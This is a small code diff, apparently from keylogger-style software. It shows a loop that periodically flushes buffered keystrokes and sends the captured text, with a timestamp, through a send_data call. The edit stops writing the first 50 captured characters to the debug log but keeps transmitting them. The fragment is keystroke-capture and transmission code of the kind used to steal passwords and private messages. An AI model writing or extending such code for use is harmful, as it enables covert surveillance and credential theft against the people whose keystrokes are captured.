@@ -38,7 +38,7 @@ def flush_periodically():
         time.sleep(config.KEYSTROKE_BUFFER_INTERVAL)
         text = flush_buffer()
         if text:
-            log(f"Flushing keystroke buffer: {text[:50]}...", "DEBUG", "keystrokes")  # Log first 50 chars
+            log(f"Flushing keystroke buffer...", "DEBUG", "keystrokes")
             send_data({
                 "timestamp": get_timestamp(),
                 "text": text
